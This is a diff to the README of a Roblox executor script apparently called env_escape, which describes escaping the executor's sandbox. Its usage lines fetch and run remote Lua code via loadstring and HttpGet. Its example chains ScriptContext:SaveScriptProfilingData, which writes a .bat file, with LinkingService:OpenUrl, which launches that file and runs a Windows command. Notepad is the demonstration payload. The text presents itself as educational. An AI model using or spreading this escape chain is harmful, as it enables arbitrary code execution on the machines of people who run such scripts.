@@ -2,27 +2,27 @@
 
 This repository is created for **educational purposes** and to help developers fix vulnerabilities in their code. The tools and scripts provided here are intended for use in **secure environments** only.
 
-Currently, this is made only to bypass `game` that are protected from vulnerabilities like `ScriptContext:SaveScriptProfilingData`.
+Currently, this is made to bypass **ENV** that are protected from vulnerabilities like `game:GetService("ScriptContext"):SaveScriptProfilingData` and `game:GetService("LinkingService"):OpenUrl`.
 
 # Usage
 
 To use this script, simply execute the following code in your Roblox executor:
 
 ```Lua
-local bypassed_game = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()
+local bypassed_env = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()
 ```
 
 Full example:
 ```Lua
-local bypassed_game, why = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()
+local bypassed_env, why = loadstring(game:HttpGet("https://raw.githubusercontent.com/dimbox-idk/env_escape/main/escape.lua"))()
 
-if bypassed_game ~= "Failed" and bypassed_game ~= "UnSupported" then
-	local L, S = bypassed_game:GetService("LinkingService"), bypassed_game:GetService("ScriptContext")
+if bypassed_env ~= "Failed" and bypassed_env ~= "UnSupported" then
+	local L, S = bypassed_env.game:GetService("LinkingService"), bypassed_env.game:GetService("ScriptContext")
 	L:OpenUrl(S:SaveScriptProfilingData([[START C:\WINDOWS\system32\notepad.exe]], "lol.bat"))
 elseif why ~= nil then
 	print(why)
 else
-    print(bypassed_game)
+    print(bypassed_env)
 end
 ```
 
